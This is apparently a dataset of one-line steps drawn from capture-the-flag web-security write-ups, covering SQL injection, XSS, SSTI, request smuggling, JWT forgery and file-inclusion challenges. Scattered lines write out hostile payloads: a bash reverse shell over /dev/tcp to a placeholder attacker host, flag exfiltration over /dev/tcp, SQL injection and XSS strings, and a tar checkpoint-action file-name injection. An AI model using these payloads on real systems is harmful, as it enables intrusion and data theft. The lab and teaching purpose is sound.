    "Exploit the type juggling loophole",
    "Intercept the HTTP request",
    "Visit the link provided in the challenge",
    "Noticed that error messages are displayed in a javascript alert",
    "Make a GET request to /secret.html.",
    "Discover the 'mock()' function.",
    "Ensure that `$to_check` is assigned the value `0`.",
    "Note that the 'secret' cookie contains the flag.",
    "Notice that the 'screenshotter' service allows users to enter arbitrary URLs.",
    "Identified content lengths as indicators of page existence due to uniform content length of Not Found (404) pages.",
    "Infer the presence of additional log files.",
    "Verify reception of the flag 'dsc{th15_15_w4y_t00_much_w0rk}'.",
    "Examine GitHub repo linked in the challenge",
    "Understood that to reach this code path, 'npm_config_global' needs to be polluted.",
    "Use the public endpoint given by `ngrok`.",
    "Received the flag from the HTTP server.",
    "Observed the user registration process.",
    "Note the usage of the `unserialize` function",
    "Create a Python script to convert the hexadecimal values in the line to strings.",
    "Located the flag.",
    "Execute the query '123' UNION SELECT 1, sqlite_version(), 3;--'.",
    "Identify string 'sRPd45w_0' in decompiled code.",
    "Use the curl command",
    "Access 'login.php.bak'",
    "Discover the flag inside the file, in reversed order.",
    "Injected a malicious payload into the file",
    "Accessed the URL /users.php?id=1.",
    "Explored further based on the directory path.",
    "Modify the server configuration settings",
    "Send the malicious JWT to the server",
    "Inspect the functionality of the 'bbcode' command",
    "Successfully complete the POST request with all required parameters.",
    "Receive a response",
    "Realized that an attacker can set up a GitHub Pages site with a subdomain that matches the site domain.",
    "Payload catches and sends the response, containing the admin's hash, to an exploit server",
    "Base64 encode the private key.",
    "Analyzed the response",
    "Learned that the backend server checks for the 'secret' cookie.",
    "Spoof the cookies",
    "Discover that the Express application is put behind a reverse proxy (Apache Traffic Server).",
    "Use hexadecimal content",
    "Inject an address into the URL parameter.",
    "Submit a blank value for the 'n' parameter in the web application.",
    "Fuzzed the input values.",
    "Include the base64-encoded payload in the command.",
    "Noted that the poll options are exfiltrated to `example.com`.",
    "Start the brute forcing process",
    "Duplicate an image file",
    "Escalate privileges",
    "Used the page string as '' and die(show_source('templates/flag.php')) or ''",
    "Identify the vulnerable order_by() function",
    "Check if the combined size of uploaded files exceeds the size of 10 tar records.",
    "Discover an alternative approach to bypass authentication",
    "Found the index.html file",
    "Identified that the blog owner has preference for Canonical and Bazaar.",
    "Created a new GitHub Pages site.",
    "Discover the exposed Meteor methods.",
    "Found alternative solution posted by P4Team.",
    "Incorporate the token identified in the Javascript files into the POST request.",
    "Read the information about 'Brobot' in the 'index.html' file",
    "Ensure that the renderer visits our attacker-controlled site.",
    "Crafted a token with 'admin' as the user.",
    "Access the website.",
    "For each text fragment, detect if a callback is received.",
    "Exploit the fact that the current site and the iframe's source are both `http://localhost:3000`.",
    "Realize 'yarn dev' runs 'vitepress dev src'.",
    "Set 'flagConverted' on the previously set sessionID.",
    "Name the cookie 'made-an-account'.",
    "Understand many calls to 'window' were made in the CheckPassword function",
    "Retrieved the flag from the `/api/flag` endpoint.",
    "Identify that the code uses random numbers to make the CAPTCHA text.",
    "Attempt to upload a file.",
    "XSS payload is generated by sending a POST request to /api/create",
    "Recognize 'SSTI' in the given URL",
    "Craft a request to set the theme to '<?php phpinfo() ?>'.",
    "Attempt to exploit the vulnerability using standard payload.",
    "Reveal a PHP serialized class",
    "Identified lack of validation for 'Content-Length' headers as the cause of the vulnerability.",
    "Reviewed online documentation.",
    "Work out bugs in the Python code.",
    "Check the server logs.",
    "Identified that the input is copied to a mmap-ed memory region within the function.",
    "Investigated methods for exploiting XSS attacks.",
    "Set up a netcat listener on my server",
    "The script printed out the flag after successful execution.",
    "Combine all password parts into a single string",
    "Executed the verified and assembled shellcode.",
    "Received npm install warnings during installation",
    "Determine that the .phtml extension is not being filtered.",
    "Formulated a strategy to provide a custom host.",
    "Find a different URL 'https://freewifi.ctf.umbccd.io/staff.html' in the packet",
    "Recognize from the source code that it is using jQuery's html() method.",
    "Identified a potential SQL Injection vulnerability.",
    "Verify the obtained credentials: `manager:bigsanta!` and `admin:tryharder`.",
    "Open a new window from the exploit server.",
    "Discover that the feedback is sent via XML composed by JavaScript.",
    "Discover that 'preg_replace' is vulnerable to RCE (Remote Code Execution) using '/e'",
    "Recognize 'login' as the user-controllable portion",
    "Loop through each character.",
    "Find faulty secret key handling in the Python source code.",
    "Leverage 'lower' filter to bypass 'subclasses' string.",
    "Note the mention of an FBI DB dump at https://tinyurl.com/fbi-hack",
    "Send JavaScript code to the browser instance.",
    "Created a base64 encoded string.",
    "Attempt to use the local-host address.",
    "Noted that exception messages are displayed in alert pop-ups",
    "Script retrieves all characters.",
    "Download the source code.",
    "Understood the voting system of the webpage.",
    "Use Python's requests library",
    "Attempted to run shell commands.",
    "Discover another endpoint: http://challenges.auctf.com:30022/hidden/nextstep.php.",
    "Figured out that the homepage is loaded as a result of an HTTP GET request to '/books.php?type=list'.",
    "Access the website: http://toomanycredits.tamuctf.com",
    "Create a crafted payload utilizing XXE.",
    "Receive a notice that the request body must be JSON.",
    "Research about the versions of Node.js and ATS used.",
    "Read the challenge description.",
    "Observe that this allows the server to pass the security checks and flag the token as true",
    "Formulate a strategy to leak the debugging port.",
    "Get the flag by reading from a file in the '/etc' directory",
    "Confirm the second 'if' statement would be passed.",
    "Use the crafted query to access the admin console via internal request.",
    "Utilize hardcoded key.",
    "Confirmed buttons trigger standard Linux commands.",
    "Identify the GET form with 'search' parameter in 10.0.42.200.",
    "Successfully obtained the flag.",
    "Identify the capability of setting the 'theme' value in the session using the 'theme' GET query parameter.",
    "Fail to exploit the vulnerability.",
    "Continue the decoding process by solving for 'c' in the equation: c = seed, c0 = c + prev_encoded_arr[0] * 256, encoded_arr[0] == c0 % 58.",
    "View the HTML source code.",
    "Brute force the JWT secret with John The Ripper.",
    "Transmit it safely in an HTTP GET request to the attacker's server.",
    "Analyze the contents of 'build_flag_checker.yml'",
    "Identify that the service lists all the items in the mentioned directory.",
    "Use the credentials for `http://app/` in the fetch request",
    "Recognized that the `/api/token` endpoint is in `LoginPage`.",
    "Identify that the challenge is a Cross-site Scripting (XSS) challenge.",
    "Create a phar file.",
    "Find opportunity to bypass the second 'If' statement",
    "Identify how the 'id' in the token is created.",
    "Opened the Google Chrome console.",
    "Identify the existing user 'bob' from the authentication response",
    "Note the allowed HTTP operations: 'GET', 'POST', 'HEAD', 'OPTIONS'",
    "Indicated potential 'eval' being done on the string",
    "Set the 'Host' as 'dscvit.com'.",
    "Search for a PHP payload that creates a web shell.",
    "Observed line in the scan result.",
    "Received a SQL error.",
    "Realized the Content-Type was 'text/xsl'.",
    "Realize that there is no vulnerability in the ws.origin.",
    "Find the validation function in the code.",
    "Perform GET request to host https://space.sdc.tf with the endpoint /api/status.",
    "Create a client script based on packet structure knowledge.",
    "Noted that incoming data was saved into HTML files",
    "Verified that the event handler is added after meeting several checks.",
    "Find that the service functions similarly to Pastebin",
    "Noted the single-threaded nature of the JavaScript event loop.",
    "Understand that '$regex' allows regex patterns for note contents.",
    "Note that the relative paths now load scripts from the attacker's server.",
    "Identified a mutation with the `<table>` element.",
    "Open Postman or a similar tool for sending HTTP requests.",
    "Analyze the source code of the page.",
    "Bypassed strip_tags using the PHP bug.",
    "Visit the provided URL",
    "Reviewed online documentation.",
    "Download all the contents of the Git repository from the website.",
    "Simultaneously wrote a Python script",
    "Retrieved the PHP source code.",
    "Work on bypassing '}}' by using an if-else statement.",
    "Execute Prototype pollution attack.",
    "Identify the PHP source code provided that includes a User Submitted file inclusion vulnerability",
    "Note that it includes the ability to upload photos.",
    "The 'smtp_exec' variable is used as an argument to the Exec2 routine",
    "Identify a Flask webpage",
    "Send the flag to an external server using the '/readflag>/dev/tcp' command",
    "Identify a SQL Injection vulnerability within the function.",
    "Use the commit IDs to fetch further git objects from the server.",
    "Understand that the challenge focuses on exploiting dynamic renderers",
    "Point the server to the testing server IP address or domain",
    "Realize that 'jsonwebtoken' 3.2.2 has a known authentication bypass vulnerability.",
    "Understood that trim(string, character) will remove `character` from `string`.",
    "Included a dummy value as the request body.",
    "The flag is `csictf{5h0uld_5tr1ng1fy_th3_p4r4ms}`",
    "Observe the interface to a router with a ping functionality.",
    "Concluded the webpage is vulnerable to SQL injection attacks.",
    "Verify that an 'upload' page is mentioned in the challenge description",
    "Investigate the GitHub Actions workflow runs",
    "Observed the source code closely for additional checks or controls.",
    "Confirm that the SQL injection vulnerability exists.",
    "Identified behavior: if the host is not found or the URL is invalid, a specific message is returned.",
    "Communicate with any TCP server using Gopher protocol.",
    "Bypass further server checks",
    "Recognize the potential for Server-Side Template Injection (SSTI)",
    "Confirm that no error occurs.",
    "Passed a random value.",
    "Identify the username and password values.",
    "Modified the requests after reaching the backend server.",
    "Successfully read the remote files.",
    "Identified a line of code where user input is passed unfiltered.",
    "Used `1'; SHOW TABLES;`.",
    "Study the downloaded source code.",
    "Inspect the given source code.",
    "Injected '127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1'.",
    "Exploited the secondary SQL injection vector.",
    "Read and store the content of the initial PDF files.",
    "The malicious JavaScript code is executed on the client's side.",
    "Confirm that the repo belongs to a user named Magpie Inc",
    "Use the known hash of an empty string as a token value for authentication.",
    "Join the 'class' string with preceding and ending '__' characters using 'join' filter.",
    "Bypass 'getitem' by constructing a string.",
    "Identified potential vulnerabilities.",
    "Apply rot13 decoding on the 'admin' value.",
    "Manipulate `utils.FONTS[10]` using the off-by-one error",
    "Discover that there is no limit to the number of attempts made with the same token, as long as correct CAPTCHA code is provided.",
    "Attempted opening a webshell.",
    "Arrive at page with the flag.",
    "Checked 'req.files' in check.js.",
    "Linked the vulnerability to the deserialization process.",
    "Observe the flag displayed on the website.",
    "List the contents of the current directory on the Challenge server.",
    "Structure the payload in JSON format.",
    "Understood that the application can be exploited via a XXE attack.",
    "Note that the code ignores the first letter if it's uppercase.",
    "Found 'ups_status' and 'restart_ups' commands return output from local web server.",
    "Set the effective user and group IDs to that of the SUID and SGID permissions.",
    "Realized the existence of a HTTP request smuggling vulnerability.",
    "Replace the username with 'admin'.",
    "Sent the payload to the HTTP server.",
    "Use the page count and PDFs list to write a manipulated 'hacked.pdf' file.",
    "Prepared an SQL injection using 'UNION' clause to search for 'flagman69' user.",
    "Flip one random bit in the wordpress installation",
    "Encode the compressed object to Base64",
    "Investigate the source code of the website.",
    "Identify the need for a 'token' to perform certain actions.",
    "Discover the requirement to login as an 'admin' user.",
    "Apply logic to explore the use of commas as input.",
    "Observe that directory listing is active",
    "Identify PHP-Proxy as having a Local File Inclusion (LFI) vulnerability.",
    "Conduct online research",
    "Review challenge",
    "Used the payload 'username=test&password=test' or 1=1 LIMIT 1;#'.",
    "Decode the field First-Flag.",
    "Catch the reverse shell using the public endpoint.",
    "Access the /robots.txt URL.",
    "Successfully fetch the flag using the XSS payload.",
    "Create a URL with the successful payload.",
    "Blacklist works based on 'localhost' and '127'.",
    "Utilize the un-blacklisted linux redirection character '<'.",
    "Test inputting content in MiniMag format",
    "Recognize that the Origin request header comprises the webpage URL in the format: ://hostname:port.",
    "Understood it led to 'this.http.get('/api/answer')'.",
    "Extract hidden data from the .DS_Store file.",
    "Create a PHP file named 'payload.php'",
    "Observed that the HTML file establishes a connection to a Firestore environment.",
    "Check redirection in the window.",
    "Put the result in an iframe.",
    "Note that the conditional statement sets a cookie with the true flag if certain values are present",
    "Planned to execute 'curl http://localhost:3000/get_flag' to obtain output through the webpage.",
    "Open the app's login page.",
    "Obtained index.php source code from source code.",
    "Understand that the script prevents rendering of the body content",
    "Retrieved the signature from the first signed PDF.",
    "Use the `dirb/wordlists/common.txt` wordlist.",
    "Navigate to the sources tab in the inspection tools",
    "Identify that these keywords are sourced from the author of the CTF challenge",
    "Notice that files with commonly used extensions are downloaded.",
    "Identify the 'secret key' for the site's cookies: flour_sugar_chocolate_and_lotsalove.",
    "Check the Nginx configuration.",
    "Observe that the path '/' lists information including server source code.",
    "Realize that the filtering of sha512.js will cause the DOMValidator.js to crash.",
    "Visited the challenge website",
    "Fetch the URL using the 'Requests_On_Steroids' function.",
    "Found the flag 'accessdenied{1t_w4s_h1dd3n_h3r3_594a9sd}' in the JavaScript file.",
    "Interpret that 'b1' is initialized with a random number from 0-500.",
    "Noticed the absence of legitimate ownership verification during file retrieval.",
    "Retrieve the flag",
    "Identify that the URL of the created webpage is a base64 encoded form.",
    "Encode the serialized object with base64",
    "Found that 'POST' and 'PUT' returned a different result.",
    "Find the details of the desired user under the post search section",
    "Use wildcard '?' to match any single character.",
    "Execute 'ls -al' command",
    "Analyze a Python script.",
    "Discover a JavaScript script in the HTML.",
    "View the source code of the program.",
    "Submit the login form.",
    "Recognized that any values can be used for 'username', 'password', and 'salt' as long as the if condition is met",
    "Identify the code normalizes file paths.",
    "Included the payload in the URL.",
    "Hypothesized that the page might be checking the client's IP to decide if it's an admin.",
    "Decrypted the jwt token using jwt.io",
    "Connect to the website.",
    "Identify the debugging private key.",
    "Discover a bug in the /admin/system/refresh_session/ endpoint.",
    "Confirm the password from a known resource.",
    "Specify 'rockyou.txt' as the dictionary file.",
    "Confirm the ability to upload TPL files.",
    "Check if the uploaded zip file should contain a `run` bash script.",
    "Log in using the provided credentials.",
    "Identify a working payload with username `admin' -- ` and any password.",
    "Create an insertion point",
    "Discover connection between successful HTTP request smuggling attack and second request with admin headers.",
    "Take the third part of the flag from step 5",
    "Verify the server code location from the provided Dockerfile as '/code/app.py'.",
    "View the website contents.",
    "Retrieve the challenge flag.",
    "Share the generated URL with the admin.",
    "Visit the admin's profile and find out it is private.",
    "Allowed reading the flag",
    "Send first GET request with 65534 empty spaces.",
    "Observe functionality to create custom cowfiles via the URL: `http://3.93.128.89:1204/cow_designer`.",
    "Read the file 'flag210d9f88fd1db71b947fbdce22871b57.php' using the same technique applied during reading of 'config.php'",
    "Repeat the process until the entire flag ('flag{4lly0Urb4s3}') is discovered.",
    "POST data that includes `constructor/prototype/outputFunctionName`.",
    "Understood that the `'re.match'` only matches at the _beginning_ of the string.",
    "Identify that using the octal notation can bypass the restrictions.",
    "Line shows: '+ /.env: .env file found. The .env file may contain credentials.'",
    "Go to 'Inspect' -> 'Storage' -> 'Cookies'.",
    "Perform an SQL injection attack on the login form",
    "Format the code in a more readable format",
    "Retrieve the flag.",
    "Understand that Prerender is used to render sensitive endpoints",
    "Visit route '/?page=payload'",
    "Received fire-place[0].html e4a4c2321d18246d027184605ca52866 as the challenge.",
    "Understand that the script would theoretically make any user follow the attacker account.",
    "Find the exploit related to the identified CVE",
    "Note the condition within the 'admin_status' function.",
    "Extract the response text (HTML).",
    "Access the given URL.",
    "Visit a non-existent route starting with '/admin/'.",
    "Summarize that the flag must be 'zer0pts{K4nt4n_m34ns_4dm1r4t1on_1n_J4p4n3s3}'.",
    "Discover the flag 'rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}'",
    "Set up a wildcard DNS listener.",
    "We run this server on all interfaces '0.0.0.0' on port '16361'.",
    "Conduct research on the CVE related to this challenge",
    "Code the script to play the game repeatedly.",
    "Send a second POST request to /feed.php.",
    "Attempted to read the flag using 'cat ./system/of/a/down/flag.txt'.",
    "Use btoa javascript function.",
    "Upload 'collision2.pdf' to the challenge page.",
    "Automated a bruteforce attack with a Python script.",
    "Realized that the 'data-last' attribute contains the victim's saved note.",
    "Note the responses for each input.",
    "Use 'dirb' tool",
    "Create the file '--checkpoint-action=exec=sh shell.txt'.",
    "Noted the process of converting markdown input to PDF file for download.",
    "Find out the flag",
    "Inspect the source HTML.",
    "Analyzed the generated PDF.",
    "Found that we can load any JavaScript file.",
    "Found an error 'jquery-3.3.1.min.js:2 Uncaught SyntaxError: Unexpected token {'",
    "Encoded the fetched cookies in base64.",
    "Use the functions 'get_hidden' and 'get_passwords' in a brute-force attack to find the correct password for the username 'jack'.",
    "Observed a request to '/save.php'.",
    "Identify the presence of a tripcode",
    "Send the URL to the 'admin bot'.",
    "Include `constructor/prototype/offline` in the POST data.",
    "Configured the PHP script to redirect to itself 19 times.",
    "Exploited the Remote Code Execution (RCE) vulnerability to gain unauthorized access to the system",
    "Note that the Flask server treats underscores ('_') as hyphens ('-')",
    "Generate the admin 2FA codes with the authenticator application.",
    "Examine the feedback form on the website.",
    "Flag is inside the hidden sheet",
    "Understand how the token is signed using 'store.key'.",
    "Examine the `.git/logs/HEAD` file.",
    "Crafted a malicious HTTP GET request to exploit the identified vulnerability",
    "Identify the presence of 'flag.txt' file in the parent directory.",
    "Applied the knowledge of the discovered vulnerability to infer certain characteristics of the web application.",
    "Use a payload to leak the source code of PHP.",
    "Understand the possibility of accessing the session file through the LFI vulnerability.",
    "Identify the revisions containing the changes.",
    "Set up a Python-based environment.",
    "Exploit PHP using loose comparison.",
    "Fetch various SQL injection payloads from [swisskyrepo/PayloadsAllTheThings GitHub repository.",
    "Identified behavior: if SSRF is detected, a specific message is returned.",
    "Check the response of the POST request for a session cookie.",
    "Submit the form",
    "Use combination of uppercase, lowercase, numbers, underscore, and curly braces for domain",
    "Inject the snippet (`EOC\n$eyes=`cat flag`;print '$eyes';`) through another HTTP POST request to /cow_designer.",
    "Assume that one of these notes contains the CTF flag.",
    "Analyzed the requested pages",
    "Received a response for the second consequent request.",
    "Note that the redirected URL contains the flag.",
    "Apply the base64 encoding filter to allow for file reading.",
    "Access the PHP environment file.",
    "Retrieve the JavaScript file from the webpage.",
    "Note that 'Content-Type' is strictly checked in the header-setting function.",
    "Analyzed the provided PHP source code.",
    "Note the MongoDB storage of a password with username 'admin'.",
    "Understand that the mysqljs/mysql package is used without the option stringifyObjects: true.",
    "Understand that 'cross-site WebSocket hijacking' can be used to obtain and exfiltrate the flag.",
    "Upload another LaTeX document",
    "The brute-force attack was successful.",
    "'check' is a predefined string expected in the response of a successful login.",
    "Realize that logging in as admin is necessary to access the flag.",
    "Identified the challenge as a NoSQL Injection task",
    "Observe that anything after a whitespace is removed.",
    "Input the URL 'https://poems.asisctf.com/books.php?type=excerpt&id=0%27%20union%20select%201%20%23' to further test for vulnerabilities.",
    "Constructed the payload to send encoded cookies to a pre-defined URL controlled by the attacker.",
    "Navigate to the 'Sources' tab",
    "Used the discovered page URL (`http://0.0.0.0/Secret_admin_cookie_panel`).",
    "Submit the manipulated username and password.",
    "Further reduce the payload character count by poking around and using different functions",
    "Enter the combined password into the portal",
    "Understand that the challenge is to pass checks.",
    "Observe that the JavaScript code prevents 'script' tags.",
    "Determined that the treasury.js file can help understand the actions performed on the site.",
    "Observe the encoded string returned by the event",
    "Noted the absence of 'window.enable_experimental_features'.",
    "Note that Nginx blocks '/debug*'.",
    "Find the source code of the web app in the www.zip file.",
    "Identify needed parameters: username, nonce, and cnonce.",
    "Notice the mention of `shell_exec` on the website.",
    "Retrieved table names from the database by manipulating the SQL query using 'moneys=' parameter.",
    "Authenticate into the system.",
    "Perform a basic analysis of the cookies.",
    "Failed to open a reverse shell.",
    "The script automates the process",
    "Printed the content of the index.php file.",
    "Use the retrieved password to get the flag: actf{still_no_sql_in_the_sequel}.",
    "Open the body of the HTTP request.",
    "Determine that the injection is limited to 32 characters.",
    "Acknowledge that DOMPurify is pretty secure.",
    "Exploited the query to bypass the authentication check.",
    "Change the admin account's password.",
    "Understood that it is possible to set custom values for 'salt' and 'hash'",
    "View the page source.",
    "Determined a correct guess for the search.",
    "Create a manipulated cookie for bypassing session-based authentication.",
    "Included a second 'Content-Length' header with a value of 26.",
    "Recognized a potential SSRF vulnerability associated with `wkhtmltoimage`",
    "Find a flag.txt file in the '/admin' directory.",
    "Access the content attribute of the identified meta tag containing the flag.",
    "Introduced the crafted payload into either the top text or bottom text of a request.",
    "Set the 'lion-token' cookie to the generated token.",
    "Exfiltrate the contents of the 'flag' file in the POST request.",
    "Identify that /sakura allows interaction with the Redis cache.",
    "Submit the form.",
    "Read strings from the binary.",
    "Spot an interesting behavior with 'RegExp.prototype.test()' used with regex containing the global flag.",
    "Receive the flag in the body of the returned page",
    "Revealed default credentials.",
    "Click on the link to enter the chat.",
    "Attempt to inject an attribute into the 'img' element of the response.",
    "Waited for the API to be loaded in the challenge page.",
    "Observe that the web proxy application is 'Powered by PHP-Proxy'",
    "Examine the init() function of the website.",
    "Proceed to send a GET request to the provided URL if the IP is not private.",
    "Ensure the payload visualizes and reads contents of 'flag.php'.",
    "Successfully display the differences between the two git commits.",
    "Enter junk value to log in.",
    "Note the regex format /^{\"hash\": [0-9A-Z\"]+}$/",
    "Considered using a cache probing attack to detect whether a search was successful.",
    "Inspect the response from index.jsp.",
    "Noted the specific flag value: HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}",
    "Identify the type juggling scenario",
    "Determine that the 'notes.count' function is unauthenticated.",
    "Understand that the crash of DOMValidator.js will allow the execution of <script>alert('pwned')</script>.",
    "Identify a URL for the server to request.",
    "Understand that it allows the creation and sharing of messages",
    "Tried all HTTP verbs for each endpoint.",
    "Paste the copied output into the function body.",
    "Realized the ATS server forwards the payload as a single request to the Nginx backend.",
    "Ensure the site URL in the payload is using HTTPS.",
    "Submit the final payload to complete the challenge.",
    "Wrote the received response to stdout.",
    "Realize that the endpoint `getimg.php` is vulnerable to Local File Inclusion (LFI), allowing files on the server to be read.",
    "Note that the JWT token needs to have the role attribute changed to admin.",
    "Understand that MFA token is only 4 digits and take advantage of this limited search space by sending batches of thousands of queries together, thereby reducing the number of required CAPTCHA responses.",
    "Able to run shell commands.",
    "Assume the posting date as the current date",
    "Connect to 'https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php'.",
    "Admin bot visits URL submissions",
    "Each page had one letter for the name",
    "Understand the variable sets the type attribute for the script element",
    "Utilize the web shell to gain access to the file system.",
    "Monitor the response for headers.",
    "Send POST request to '/api/tet/list' endpoint.",
    "Recognize that the set input reflects in the included PHP code.",
    "Note the various constraints mentioned in the header",
    "Replace the existing 'with' value, 'discord', with a different value, 'foo'.",
    "Note the changes in the displayed content.",
    "Observed restrictions on certain characters and strings.",
    "Was presented with an authentication form displaying the user's IP.",
    "Created the shellcode ensuring it has no NULL bytes.",
    "Get redirected to the flag page.",
    "Submit an integer value as the input in the web application.",
    "Use Burp Suite.",
    "Identified a string within the JavaScript scope",
    "Navigate to the website",
    "Fail to inject the code with the embedded script",
    "Note that the flag is in rot13 encoding.",
    "Injected Carriage Return Line Feed (CRLF) in the username field",
    "Admin's token access is required to access the flag",
    "Accessed the 'app.secret_key' value",
    "Use print to display the output",
    "Make a callback to our server with the data.",
    "Noted that the 'doit' method is called in the '__destruct()' function.",
    "Point the 'screenshotter' service to the deployed page.",
    "Revisited the page with the newly acquired 'admin' cookie.",
    "Analyzed the provided source code.",
    "Locate the usage of 'eval' in util.py.",
    "Use the retrieved private key for signing",
    "Analyze the given files.",
    "Search for the source code of the web application",
    "Check the cookies.",
    "Identify ability to control 'astProgram.type' variable",
    "Choose a .php file for upload.",
    "Analyze the obfuscated front-end source code.",
    "Identify that developers may have used blacklisting to prevent path traversal.",
    "Take note that the data is sanitized by DOMPurify",
    "Confirm the Prototype Pollution vulnerability from a GitHub Pull Request.",
    "Encountered an issue with the 'search' feature.",
    "Realize the alternative method involves using SQL injection",
    "Send the payload via POST request.",
    "Discover that the site is also vulnerable to Local File Inclusion (LFI)",
    "Extract the system flag from the response.",
    "Fetch further missing git objects from the server.",
    "Examined the application's source code",
    "View the contents of the directory",
    "Target the admin as the victim of the CSRF attack.",
    "Observe that the flag is revealed on the browser",
    "Navigate to the 'Sources' tab in the developer tools.",
    "Noticed that the server uses 'Content-Length' header even if 'Transfer-Encoding' header exists.",
    "Verify that the role was changed to 'admin'",
    "Observe that the new representation of the flag is a 152-digit long number.",
    "Find a HTTP request smuggling issue with incorrect parsing of chunk extensions.",
    "Gain full control of the $whoareyou variable.",
    "Open the 'build.sh' script referenced in the GitHub Actions file",
    "Identify the target page '/post.php'.",
    "Print the content of the environment file.",
    "Receive the contents of the 'flag' file in the HTTP response.",
    "Access the reference to the current working directory using 'cwd/'.",
    "Triggered an error.",
    "Verified it returns data for user ID 1.",
    "Observed the attack working even with Chrome's cache partitioning policy.",
    "Observe the 'Permission Denied!' message",
    "Set 'user.code' to a random 4-digit number.",
    "Observe redirection when the queried amount exceeds the user's actual balance.",
    "Identify '/cmd.php' endpoint.",
    "Choose the vulnerable points in the script to perform the injection.",
    "Print any HTTP error during the page request.",
    "Log in using the newly changed credentials of the admin account.",
    "Discover that the guest sign in portal is not implemented",
    "Objective is to dump the database and retrieve the flag",
    "Connect to target IP:33337.",
    "Realize that the /do-report endpoint is mapped to /forbidden.",
    "Checked for an extra div when search is correct.",
    "Attempted to navigate to login.php.",
    "Discover admin login page.",
    "Used request.args as the argument",
    "Use the newly crafted URL for the website response check.",
    "Generate a file with random content.",
    "The bug is in the unauthenticated index page.",
    "Perform the action with `nobody` user permissions.",
    "Render the XSS payload: '<img src=\"/images/error.jpg\" alt=\"selected category random\"onerror=\"alert``\" />'",
    "Bypass 'subclasses' by constructing a string.",
    "Modify permissions of s3scanner.py",
    "Iframe's message is received and processed in /demo",
    "Find that 'notes.count' is being executed through websockets.",
    "Find the source code file 'flagchecker.c' in the repo",
    "Set the 'Referer' header as 'google.com'.",
    "Conducted a scan for the 172.16.2.0/24 subnet.",
    "Observe the information revealed about the server environment.",
    "Conduct research on prototype pollution vulnerability.",
    "Get the flag",
    "Note that the 'A' placeholder in the code has to be replaced with `\\n (`0x0a`) in a proxy.",
    "Create a script.",
    "Set the production value to true in the json file",
    "Send the introspection query to the graphql endpoint.",
    "Open the website.",
    "Realize that the endpoint can be accessed without authentication.",
    "Identify the website's vulnerability to XSS.",
    "Designed the shellcode.",
    "Accessed the website.",
    "Read the flag using the established reverse shell.",
    "Decode the jwt cookie",
    "Decide to generate the token from one IP address",
    "Understand the necessity of having at least 32 characters in the 'fqdn'.",
    "Execute the 'ls ../' command to check the parent directory.",
    "Conclude that the directory function receives an array with a single string 'flag' as an argument.",
    "Establish a pattern based on the previous observation.",
    "Access Symfony profiler interface.",
    "Create a final script to send the command for flag extraction to the server.",
    "Find the onclick attribute",
    "CSRF payload makes a callback to the exploit server with the page contents",
    "The '__toString()' function can return the contents of a file",
    "Note that the server does not perform security checks on the alg or secretid fields in the JWT",
    "Analyze the response from the previous step",
    "Unlock the flag and source code using the uploaded PDFs.",
    "Noted the sequence of function calls",
    "Identified a voting procedure challenge.",
    "Use the output of the script.",
    "Deployed the Python script as a Lambda function",
    "Create a signed cookie in the browser.",
    "Understood the methods used for voting.",
    "Check the value of the cookie 'not_admin'",
    "Recognized that 'text/xsl' can potentially allow Cross-Site Scripting.",
    "Discovered another flag and a GitHub repository.",
    "Found the server endpoint was also vulnerable to Server-Side Template Injection (SSTI).",
    "Visited the website.",
    "Make a note of any hints about versioning control systems, specifically git.",
    "Deployed the GitHub repository to GitHub pages under a '.jsapi.tech' subdomain.",
    "URL-encoded the payload.",
    "Discover the smarty-4.0.1 PHP library.",
    "Open a pop-up to the target URL",
    "Read the flag displayed in the alert.",
    "Decode the initial array with base64 encoded strings in the JavaScript script.",
    "Navigate to the disallowed path /ingen/.",
    "Adjust the value of the secure cookie 'admin' to the desired comparison value 'true'.",
    "Realize the role of type juggling in this matching process.",
    "Received a PNG image with a crossword puzzle from '/square/' endpoint.",
    "Print the session cookies.",
    "Check if 'True' is present in the response.",
    "Registered a new user.",
    "Retrieve only 'P4s5_w0Rd' string.",
    "Realize that although XSS can be performed, it would only affect the currently logged in user and not the admin.",
    "Received flag 'F#{wtf_5trp0s_}' in response.",
    "Determine it potentially allows command injection.",
    "Identify that the 'Authorization' header should contain a JWT.",
    "Understand that ATS processes LF as line endings.",
    "Note that the password length is less than 30 characters",
    "Create new users upon successful authentication.",
    "Identified that functions for shell command execution were disabled.",
    "Read the official Firebase Firestore documentation.",
    "Identify that the requests are made to '/captcha'.",
    "Decided to find a paper that was not published.",
    "Send GET request to 'https://shiba.yactf.ru/' to get the final page after 1500 iterations.",
    "Locate the authenticated-user cookie.",
    "Study and understand the given client-side web exploitation challenge.",
    "Identified HAProxy configuration.",
    "Realize that this results in the setting of the innerHTML of the 'result' element.",
    "Translate the hex-encoded list, var _0x575c, into a more readable format",
    "Utilized SQLMap targeting 'login.php' page.",
    "Understand that the PHP proxy allows users to visit websites from it.",
    "Found the bundle.js file",
    "Change the 'User-Agent' header to mimic a Google bot.",
    "Access the desired file using the exploited vulnerabilities.",
    "Set the file extension as .tpl.",
    "Identify the need to overwrite the <userID>_isAdmin value.",
    "Learn that the SQLite code can be injected into the vulnerable order_by() function",
    "Realized the asserts in 'index.php' were in strings",
    "Interpreted the PHP script",
    "Take note that the embedded iframe is within the same origin",
    "Observe a redirection to an 'about:blank#blocked' page when the limit is exceeded",
    "Implemented SQLmap to exploit the potential SQL injection vulnerability.",
    "Open the developer tools.",
    "Observed an image printed as a response to the login.",
    "Passed an arbitrary character(',') into the X-FORWARDED-FOR HTTP header.",
    "Attempt a command injection via the cookie.",
    "Submit an authentication request with a username.",
    "Base assumption on the upload page validation",
    "Base64 encoded the output of the PHP 'phpinfo()' function.",
    "Ensured the modifications reflected the initial intention.",
    "Understand how to modify user's profile and upload images.",
    "Discover that the secret key is 'butter'.",
    "Understand that this makes the match vulnerable to type juggling.",
    "Due to the previous step, made an attempt to use an SQL injection on the challenge platform.",
    "Use `attr()` Jinja2 filter to pass blacklisted characters",
    "Formulated a suspicion of possible Cloudflare protections.",
    "Retrieve the flag.",
    "Accessed the website provided in the challenge",
    "Retrieved the flag: actf{traversed_the_world_and_the_seven_seas}",
    "Recognize the potential involvement of code str_replace in changing language.",
    "Identified the usage of 'Content-Length' header with 'Transfer-Encoding' header as a request smuggling vulnerability.",
    "Observe that 'Requests_On_Steroids' function in 'main.py' supports Gopher protocol.",
